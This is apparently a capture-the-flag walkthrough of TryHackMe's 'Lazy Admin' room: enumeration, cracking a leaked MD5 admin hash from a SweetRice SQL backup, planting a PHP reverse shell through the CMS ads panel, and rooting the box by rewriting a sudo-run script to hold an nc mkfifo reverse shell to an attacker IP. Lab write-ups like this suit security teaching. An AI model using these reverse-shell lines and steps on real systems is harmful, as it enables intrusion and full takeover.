# Lazy Admin

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### ffuf

```
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
content                 [Status: 301, Size: 314, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10
/content                [Status: 200, Size: 2199, Words: 109, Lines: 36]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10]

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2199, Words: 109, Lines: 36]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10]
```

There is a `"content"` directory

```
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed

Powered by Basic-CMS.ORG SweetRice.

//down down bad practices...

These tips may be useful for you install SweetRice.

1,Open your website.

Default,when you installed SweetRice,your website's status is "close",and SweetRice will show "Site is building now , please come late.?" to visitors,if you ready to open your website,you can go to Setting -> General , uncheck the checkbox for "Site Close" and submit,your website's status will be "open".

When you upgrade website, this feature may be useful.You can input some words to the textarea for "Site Close Tip" to replace the word "Site is building now , please come late.?".

2,Protect your data.

SweetRice save all important file in the inc directory,there are two kinds of format ?:.txt (link.txt , htaccess.txt, lastest.txt) and .db (if track feature enabled).If you are using apache server,the file .htaccess which in inc directory will work for protect your data,if your server is nginx,you may see Security setting for Nginx.For other web server ,you may try it yourself.

3.Enable URL rewrite

Apache server supports .htaccess,when URL rewrite feature enabled ?,a .htaccess file will be saved to your web root directory.The file content is:

RewriteEngine On
RewriteBase "your web root"
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]

Nginx server does not supports .htaccess file,you may add the URL rewrite config to the nginx.conf or your nginx config file.

example:

location / {
root /htdocs;
index index.html index.php;
if (!-e $request_filename){
		 rewrite ^/demo/.+$ /demo/index.php last;
}
}

4,Set permalinks

SweetRice supports custom permalink,you can go to Setting->Permaliks to set permalinks for Attachment,RssFeed,tag etc.

5,Custom SweetRice

SweetRice is very simple,but you can easy to build your custom website,Do not like default theme?you can use the example \_themes/wblog to build a new theme or download theme from SweetRice Themes?;

Need new feature?you can build a plugin and install it,some plugin at SweetRice Plugins? and you can submit your request to us.
```

Lets visit /content/inc then

latest version of basic-cms sweetrice is 1.5.1 (no great cve anyway)

And a backup of sql database is downloadable (lol that's it)

Just read it

```
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

so basically creds are

`Lazy Admin : 42f749ade7f9e195bf475f37a44cafcb`

Its a hash and its crackable

its md5 for `Password123`

I wonder if can ssh with that? nope we gotta find a login page....go fuzz content again

we get a `"as"` directory with a login page

Ok the credentials were actually

`manager : Password123`

Still doesnt work for ssh...we have to abuse that website

in Ads panel we can create custom ads...its php code that will be executed so I say Reverse shell it is!

when created you can actiate your shell by clicking on your named ad in `/content/inc/ads`

As they say in the movies...we are in!

the user home folder is named `itguy`

```
www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
cat mysql_login.txt
rice:randompass //hohoho..great
```

FLAG #1
`$ cat user.txt`
THM{lazy_flag_for_lazy_people}

Time to get real

## Privilege Escalation

```
sudo -l
Matching Defaults entries for www-data on THM-Chal:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So we can run that perl backup script in user folder...let's analyse its code

```
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

it runs `/etc/copy.sh`...so what is that?

```
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

its already a reverse shell..we will just adapt it to point to us

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 4444 >/tmp/f' > /etc/copy.sh

sudo /usr/bin/perl /home/itguy/backup.pl
```

And we are done

```
# id

uid=0(root) gid=0(root) groups=0(root)

# cat root.txt

THM{super_flag_to_get_root_instantly}
```

Feeling lazy too now...that one room was enough for today!
